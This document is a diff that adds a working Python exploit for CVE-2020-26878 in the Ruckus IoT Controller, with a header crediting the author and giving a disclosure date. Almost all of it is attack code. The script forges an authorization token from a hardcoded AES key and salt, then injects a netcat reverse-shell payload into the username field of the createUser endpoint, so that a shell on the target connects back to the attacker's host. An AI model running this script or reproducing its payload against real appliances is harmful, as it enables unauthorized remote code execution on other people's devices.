@@ -1,0 +1,101 @@
+# Product: Ruckus IoT Controller (Ruckus vRIoT)
+# Version: <= 1.5.1.0.21
+# Vendor: https://support.ruckuswireless.com/
+# Vulnerability: Command Injection & Broken Authentication
+# References: CVE-2020-26878
+# Discovered by: Juan Manuel Fernandez
+# Exploit Title: Ruckus IoT Controller (Ruckus vRIoT) 1.5.1.0.21 - Remote Code Execution
+# Exploit Author: Emre SUREN
+# Disclosure Date: 2020-10-26
+# Tested on: Appliance
+
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import requests, urllib3, sys
+from Crypto.Cipher import AES
+from base64 import b64encode, b64decode
+from colorama import Fore
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def listen(lhost, lport):
+	opt = str(raw_input(Fore.YELLOW + "[?] Listening " + lhost + " " + lport + " (i.e. netcat) ? (y/n): "))
+	if opt == "y":
+		return True
+	else:
+		return False
+
+def generatePayload(lhost, lport):
+
+	payload="; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc "+lhost+" "+lport+" >/tmp/f; #"
+
+	return payload
+
+def generateMagicToken():
+
+	enc_dec_method = 'utf-8'
+	salt = 'nplusServiceAuth'
+	salt = salt.encode("utf8")
+	str_key = 'serviceN1authent'
+	str_to_enc = 'TlBMVVMx'
+
+	return encrypt(enc_dec_method, salt, str_key, str_to_enc)
+
+def encrypt(enc_dec_method, salt, str_key, str_to_enc):
+
+	aes_obj = AES.new(str_key, AES.MODE_CFB, salt)
+	hx_enc = aes_obj.encrypt(str_to_enc.encode("utf8"))
+	mret = b64encode(hx_enc).decode(enc_dec_method)
+
+	return mret
+
+def execCmd(rhost, rport, lhost, lport):
+
+	payload = generatePayload(lhost, lport)
+	post_data = {
+	   "username": payload,
+	   "password": "test"
+	}
+	print(Fore.BLUE + "[*] Payload\t: " + payload)
+
+	token = generateMagicToken()
+	headers = {
+		"Authorization": token
+	}
+
+	rpath = "/service/v1/createUser"
+	uri = 'https://' + rhost + ":" + rport + rpath
+
+	r = requests.post(uri, json=post_data, headers=headers, verify=False)
+	print(Fore.BLUE + "[*] Request sent")
+
+	if r.status_code == 200:    
+		print(Fore.GREEN + "[+] Successful. Check for the session...")
+	else:
+		print(Fore.RED + "[X] Failed. Check for the response...")
+		print(Fore.BLUE + "[*] Response\t: " + r.text)
+		sys.exit()
+
+def main():
+
+	if (len(sys.argv) != 5):
+		print("[*] Usage: ruckus151021.py <RHOST> <RPORT> <LHOST> <LPORT>")
+		print("[*] <RHOST> -> Target IP")
+		print("[*] <RPORT> -> Target Port")
+		print("[*] <LHOST> -> Attacker IP")
+		print("[*] <LPORT> -> Attacker Port")
+		print("[*] Example: python {} 192.168.2.25 443 192.168.2.3 9001".format(sys.argv[0]))
+		exit(0)
+
+	rhost = sys.argv[1]
+	rport = sys.argv[2]
+	lhost = sys.argv[3]
+	lport = sys.argv[4]
+
+	if not listen(lhost, lport):
+		print(Fore.RED + "[!] Please listen at port {} to connect a reverse session !".format(lport))
+	else:
+		execCmd(rhost, rport, lhost, lport)
+
+if __name__ == "__main__":
+    main()
